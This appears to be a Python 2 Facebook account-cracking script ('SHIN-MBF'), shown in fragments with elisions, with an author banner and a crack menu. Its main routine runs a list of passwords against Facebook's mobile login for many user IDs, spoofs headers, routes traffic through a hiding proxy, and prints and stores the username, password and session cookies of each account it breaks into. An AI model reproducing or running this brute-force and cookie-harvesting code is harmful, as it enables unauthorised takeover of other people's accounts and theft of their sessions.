...
# coding=utf-8
##########################################################
# AUTHOR : MR.Zy(Zainul umam)                            #
# CONTAK : 081237346234 [WHATSAPP]                       #
# GITHUB : HTTPS://GITHUB.COM/Shinzy24                   #
##########################################################
...
def banner():
	print('''
\033[1;35m    °ShinxZy°
\033[1;35m    _______ _____   _____  _______ _____   _____  -
\033[1;34m    |      |     |  |    |    |   |     | |     | |
\033[1;33m    |_____ |_____|  |    | °° |   |_____| |_____| |____

\033[1;35m      ____         ____       [®]SHIN-MBF
	...
	print("%s [!] Isi dengan benar "%(O));exit()
        ...
        if _hay_tayo_hay_nano_ in(""):
        	...
        	os.system("xdg-open https://www.facebook.com/100057370791997")
                ...
                os.system("xdg-open https://chat.whatsapp.com/085740559154")
                _kem_ = raw_input("\n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m [ ENTER ]")
                mmmasuk()
...
#    print (' Waktu : %s'%(datetime.now().strftime('%H:%M:%S'))
    ...
    print(" \033[1;36m[\033[1;35m+\033[1;36m]\033[1;33m______________________________________________")
    print(" \033[5;35m 👇👇👇👇👇👇👇👇-CRACK MENU LIST-👇👇👇👇👇👇👇👇 ")
...
def login_xx():                                                                                                    
      try:      
        ...
        post1 = ('238988288434942')
        post2 = ("238988288434942")
        post3 = ("238988288434942")
        post4 = ('238988288434942')
        post5 = ("238988288434942")
        post6 = ("238988288434942")
        post7 = ("238988288434942")
...
#        print('\r %s[ %s %s] %s/%s [OK-:%s]-[CP-:%s]'%(K,B,K,datetime.now(
    ...
    def mobil(self, user, _jeeck_X_nano_):
        ...
        for pw in _jeeck_X_nano_:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"Host":"https://m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,+/+;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            ...
            po = ses.post('https://m.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQ3MzQ2NzIyLCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%3D%3D&ref=dbl', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s%s | %s | %s ' % (H,user,pw,kuki)
                ok.append("%s | %s | %s"% (user,pw,kuki))
...
class BaseCheck():
    def __init__(self, url):
        self.http_proxy  = "http://nl.hideproxy.me"
        self.https_proxy = "https://nl.hideproxy.me"
        self.ftp_proxy   = "ftp://nl.hideproxy.me"
        self.proxyDict = {
...
test=BaseCheck(url='https://www.google.com/chrome/')
test.getrequests()
